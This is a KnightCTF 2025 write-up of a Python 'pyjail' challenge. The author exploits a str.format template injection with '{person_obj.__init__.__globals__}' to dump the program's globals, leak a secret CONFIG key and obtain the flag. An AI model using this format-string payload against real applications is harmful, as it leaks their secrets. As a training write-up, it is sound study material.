---
title: "Knight's Secret"
description: ""
pubDate: 2025-01-22
ctf: "KnightCTF 2025"
category: "pwn"
author: "sealldev"
section: "CTFs"
image: "images/25-knight/icon.png"
---



Note: This was less of a typical Pwn and was a pyjail.

We connect to the server and see this:

```bash
└─$ nc 45.56.68.122 1337
==================================================
Welcome to the Knight's Secret!
The castle's vault holds a secret key, protected within the CONFIG dictionary.
You are a knight tasked with proving the strength of the vault's defenses.
To succeed, you must craft an input to reveal the hidden key within the system.
You will be provided with a user object representing a knight, with attributes 'name' and 'role'.
Once you discover the key, input it again to receive the banner of victory.

Example of a safe template: 'Greetings, {person_obj.name}, the {person_obj.role}.'
Type 'hint' if you need guidance or 'exit' to withdraw from the quest.
==================================================

Enter your secret:
```

Our aim is to find the `CONFIG` dictionary.

We can see entering just the object shows an instance, so we know this is Python:

```
Enter your secret: {person_obj}
Output: <__main__.Person object at 0x703c0aa16480>
```

Using the [PyJail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet) I use `.__init__.__globals__` to get the `CONFIG` dictionary.

```
Enter your secret: {person_obj.__init__.__globals__}
Output: {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7e23d44d78f0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/challenge/challenge.py', '__cached__': None, 'CONFIG': {'KEY': '_KNIGHTSECRET2025_'}, 'Person': <class '__main__.Person'>, 'fun': <function fun at 0x7e23d44be340>, 'main': <function main at 0x7e23d429cd60>}
```

We can then enter the secret for the flag.

```
Enter your secret: _KNIGHTSECRET2025_
Congratulations, noble knight! You have unveiled the vault's secret.
Here is your banner of victory: KCTF{_c0ngRaT5_Kn1GHT_Y0U_g07_THE_secreT_}
```

Flag: `KCTF{_c0ngRaT5_Kn1GHT_Y0U_g07_THE_secreT_}`
